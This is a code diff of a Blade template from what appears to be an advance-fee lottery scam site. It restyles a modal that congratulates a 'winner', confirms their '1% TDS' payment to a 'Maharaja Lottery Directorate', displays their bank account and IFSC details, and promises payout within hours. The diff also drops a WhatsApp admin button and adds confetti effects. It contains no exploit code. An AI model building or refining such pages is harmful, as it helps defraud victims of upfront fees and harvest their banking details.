@@ -281,68 +281,71 @@
     </div>
 </section>
 
-<!-- Celebration Boom Congratulations Modal -->
-<div id="celebration-modal" class="fixed inset-0 z-50 bg-black/90 backdrop-blur-md hidden items-center justify-center p-3 sm:p-5 transition-all duration-500" style="position: fixed; inset: 0; z-index: 999999; width: 100vw; height: 100vh;">
+<!-- Celebration Boom Congratulations Modal (Fully Responsive) -->
+<div id="celebration-modal" 
+    class="fixed inset-0 z-[999999] hidden items-center justify-center p-3 sm:p-4 transition-all duration-500" 
+    style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 999999; width: 100vw; height: 100vh; background-color: rgba(4, 10, 26, 0.96); backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px); overflow-y: auto;">
+    
     <!-- Ambient Glow -->
-    <div class="absolute w-96 h-96 bg-[#DFB755]/25 rounded-full blur-3xl pointer-events-none"></div>
+    <div class="fixed w-96 h-96 bg-[#DFB755]/15 rounded-full blur-3xl pointer-events-none -z-10"></div>
 
-    <div class="relative bg-gradient-to-b from-[#071533] via-[#0B193E] to-[#040A1A] border-2 border-[#DFB755] rounded-3xl p-6 sm:p-8 max-w-lg w-full text-center text-white shadow-[0_0_80px_rgba(223,183,85,0.45)] overflow-hidden space-y-5 animate-in zoom-in-90 duration-300">
+    <div class="relative bg-gradient-to-b from-[#071533] via-[#0B193E] to-[#040A1A] border-2 border-[#DFB755] rounded-3xl p-4 sm:p-6 max-w-sm sm:max-w-md w-full text-center text-white shadow-[0_0_80px_rgba(223,183,85,0.45)] space-y-3 sm:space-y-3.5 my-auto max-h-[92vh] overflow-y-auto animate-in zoom-in-95 duration-300">
+        <!-- Close Button -->
+        <a href="{{ route('winnerlist') }}" class="absolute top-3 right-3 w-7 h-7 rounded-full bg-white/10 hover:bg-white/20 text-stone-300 hover:text-white flex items-center justify-center text-xs transition z-20" title="Close">
+            <i class="fa-solid fa-xmark"></i>
+        </a>
+
         <!-- Sparkle pattern -->
         <div class="absolute inset-0 opacity-15 bg-[radial-gradient(#DFB755_1px,transparent_1px)] [background-size:14px_14px] pointer-events-none"></div>
 
         <!-- Trophy Boom Icon with Bounce -->
-        <div class="relative z-10 mx-auto w-20 h-20 rounded-3xl bg-gradient-to-tr from-[#C59B27] via-[#F3D068] to-[#DFB755] text-[#071533] flex items-center justify-center text-4xl shadow-2xl shadow-amber-500/30 animate-bounce">
+        <div class="relative z-10 mx-auto w-12 h-12 sm:w-14 sm:h-14 rounded-2xl bg-gradient-to-tr from-[#C59B27] via-[#F3D068] to-[#DFB755] text-[#071533] flex items-center justify-center text-xl sm:text-2xl shadow-xl shadow-amber-500/30 animate-bounce shrink-0">
             <i class="fa-solid fa-trophy"></i>
         </div>
 
         <!-- Header -->
         <div class="relative z-10 space-y-1">
-            <span class="inline-flex items-center gap-2 px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
-                <i class="fa-solid fa-check"></i>
+            <span class="inline-flex items-center gap-1.5 px-3 py-0.5 rounded-full text-[9px] font-black uppercase tracking-widest bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
+                <i class="fa-solid fa-check text-[10px]"></i>
                 <span>TDS Submission Verified</span>
             </span>
-            <h2 class="text-2xl sm:text-3xl font-serif font-black text-white">
+            <h2 class="text-xl sm:text-2xl font-serif font-black text-white leading-tight">
                 🎉 CONGRATULATIONS! 🎉
             </h2>
-            <p class="text-sm sm:text-base font-serif font-bold text-[#F3D068]" id="modal-customer-name">
+            <p class="text-xs sm:text-sm font-serif font-bold text-[#F3D068] truncate" id="modal-customer-name">
                 {{ $customerName }}
             </p>
         </div>
 
         <!-- Details Card -->
-        <div class="relative z-10 bg-black/50 border border-[#DFB755]/30 rounded-2xl p-4 sm:p-5 text-left space-y-3">
-            <div class="flex items-center justify-between pb-2 border-b border-white/10">
-                <span class="text-[11px] uppercase tracking-wider font-bold text-stone-400">Winning Prize</span>
-                <span class="text-base sm:text-lg font-mono font-black text-emerald-400">{{ $prizeAmount }} ({{ $winningFormatted }})</span>
+        <div class="relative z-10 bg-black/50 border border-[#DFB755]/30 rounded-2xl p-3 sm:p-3.5 text-left space-y-2 text-xs">
+            <div class="flex items-center justify-between pb-1.5 border-b border-white/10">
+                <span class="text-[10px] uppercase tracking-wider font-bold text-stone-400">Winning Prize</span>
+                <span class="text-xs sm:text-sm font-mono font-black text-emerald-400">{{ $prizeAmount }} ({{ $winningFormatted }})</span>
             </div>
 
-            <div class="flex items-center justify-between pb-2 border-b border-white/10">
-                <span class="text-[11px] uppercase tracking-wider font-bold text-stone-400">1% TDS Submitted</span>
-                <span class="text-base sm:text-lg font-mono font-black text-[#F3D068]">{{ $tdsFormatted }}</span>
+            <div class="flex items-center justify-between pb-1.5 border-b border-white/10">
+                <span class="text-[10px] uppercase tracking-wider font-bold text-stone-400">1% TDS Submitted</span>
+                <span class="text-xs sm:text-sm font-mono font-black text-[#F3D068]">{{ $tdsFormatted }}</span>
             </div>
 
-            <div class="flex items-center justify-between pb-2 border-b border-white/10">
-                <span class="text-[11px] uppercase tracking-wider font-bold text-stone-400">Target Bank Account</span>
-                <span class="text-xs sm:text-sm font-mono font-bold text-stone-200">{{ strlen($accountNumber) > 4 ? '••••' . substr($accountNumber, -4) : $accountNumber }} ({{ $ifscCode }})</span>
+            <div class="flex items-center justify-between pb-1.5 border-b border-white/10">
+                <span class="text-[10px] uppercase tracking-wider font-bold text-stone-400">Target Bank Account</span>
+                <span class="text-xs font-mono font-bold text-stone-200">{{ strlen($accountNumber) > 4 ? '••••' . substr($accountNumber, -4) : $accountNumber }} ({{ $ifscCode }})</span>
             </div>
 
-            <p class="text-xs text-stone-300 leading-relaxed font-normal pt-1">
+            <p class="text-[11px] text-stone-300 leading-relaxed font-normal pt-0.5">
                 Your 1% TDS payment proof and prize withdrawal application have been submitted to Maharaja Lottery Directorate. Upon verification, the full prize balance will be credited to your verified bank account within <strong class="text-[#F3D068]">2 to 4 hours</strong>.
             </p>
         </div>
 
         <!-- Action Buttons -->
-        <div class="relative z-10 space-y-2 pt-1">
-            <a href="https://wa.me/918743978796?text={{ urlencode('Hello Admin, I have submitted 1% TDS payment (' . $tdsFormatted . ') for winning prize ' . $prizeAmount . ' under name ' . $customerName . '. Please verify and release payout.') }}" 
-                target="_blank"
-                class="w-full py-3 px-5 rounded-xl bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white font-black text-xs sm:text-sm uppercase tracking-wider shadow-lg transition flex items-center justify-center gap-2">
-                <i class="fa-brands fa-whatsapp text-base"></i>
-                <span>Instant WhatsApp Priority Verification</span>
-            </a>
+        <div class="relative z-10 space-y-2 pt-0.5">
+            
 
             <a href="{{ route('winnerlist') }}" 
-                class="w-full py-2.5 rounded-xl bg-white/10 hover:bg-white/20 text-stone-200 hover:text-white font-bold text-xs transition flex items-center justify-center gap-1.5 border border-white/20">
-                <i class="fa-solid fa-trophy text-[#DFB755]"></i>
+                class="w-full py-2 rounded-xl bg-white/10 hover:bg-white/20 text-stone-200 hover:text-white font-bold text-xs transition flex items-center justify-center gap-1.5 border border-white/20">
+                <i class="fa-solid fa-trophy text-[#DFB755] text-xs"></i>
                 <span>Return to Result Desk</span>
             </a>
         </div>
@@ -352,39 +355,61 @@
 @push('scripts')
 <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
 <script>
-    // Confetti Mega Celebration Blast
+    // Confetti Mega Celebration Blast with Top zIndex
     function triggerTdsConfettiBoom() {
         if (typeof confetti !== 'function') return;
 
-        // Left Cannon Burst
+        // Wave 1: Immediate Left & Right Cannons
         confetti({
-            particleCount: 100,
+            particleCount: 110,
             angle: 60,
             spread: 80,
-            origin: { x: 0.05, y: 0.7 },
-            colors: ['#DFB755', '#F3D068', '#16A34A', '#22C55E', '#FFFFFF', '#FFD700']
+            origin: { x: 0.05, y: 0.65 },
+            zIndex: 10000000,
+            colors: ['#DFB755', '#F3D068', '#16A34A', '#22C55E', '#FFFFFF', '#FFD700', '#FF3B30']
+        });
+        confetti({
+            particleCount: 110,
+            angle: 120,
+            spread: 80,
+            origin: { x: 0.95, y: 0.65 },
+            zIndex: 10000000,
+            colors: ['#DFB755', '#F3D068', '#16A34A', '#22C55E', '#FFFFFF', '#FFD700', '#FF3B30']
         });
 
-        // Right Cannon Burst
+        // Wave 2: Center Mega Starburst at 200ms
         setTimeout(() => {
             confetti({
-                particleCount: 100,
-                angle: 120,
-                spread: 80,
-                origin: { x: 0.95, y: 0.7 },
-                colors: ['#DFB755', '#F3D068', '#16A34A', '#22C55E', '#FFFFFF', '#FFD700']
+                particleCount: 150,
+                spread: 110,
+                origin: { x: 0.5, y: 0.5 },
+                zIndex: 10000000,
+                colors: ['#DFB755', '#F3D068', '#16A34A', '#E11D48', '#FFD700', '#38BDF8', '#FFFFFF']
             });
-        }, 150);
+        }, 200);
 
-        // Center Fireworks Blast
+        // Wave 3: Confetti Rain from Top at 500ms
+        setTimeout(() => {
+            confetti({
+                particleCount: 90,
+                spread: 120,
+                origin: { x: 0.5, y: 0.2 },
+                zIndex: 10000000,
+                colors: ['#DFB755', '#16A34A', '#F59E0B', '#10B981', '#FFFFFF']
+            });
+        }, 500);
+
+        // Wave 4: Final blast at 850ms
         setTimeout(() => {
             confetti({
                 particleCount: 120,
-                spread: 100,
-                origin: { y: 0.6 },
-                colors: ['#DFB755', '#F3D068', '#16A34A', '#E11D48', '#FFD700']
+                angle: 90,
+                spread: 90,
+                origin: { x: 0.5, y: 0.7 },
+                zIndex: 10000000,
+                colors: ['#DFB755', '#F3D068', '#16A34A', '#FFD700', '#FFFFFF']
             });
-        }, 300);
+        }, 850);
     }
 
     // Navigation Between Step 1 & Step 2
@@ -485,12 +510,16 @@
             if (data.success) {
                 // Open Celebration Boom Modal
                 const celebrationModal = document.getElementById('celebration-modal');
+                if (celebrationModal.parentElement !== document.body) {
+                    document.body.appendChild(celebrationModal);
+                }
                 celebrationModal.classList.remove('hidden');
                 celebrationModal.classList.add('flex');
+                document.body.style.overflow = 'hidden';
 
                 // Trigger Massive Confetti Boom Blast
                 triggerTdsConfettiBoom();
-                setTimeout(triggerTdsConfettiBoom, 600);
+                setTimeout(triggerTdsConfettiBoom, 700);
             } else {
                 alert(data.message || 'Error submitting TDS payment proof.');
                 btn.disabled = false;
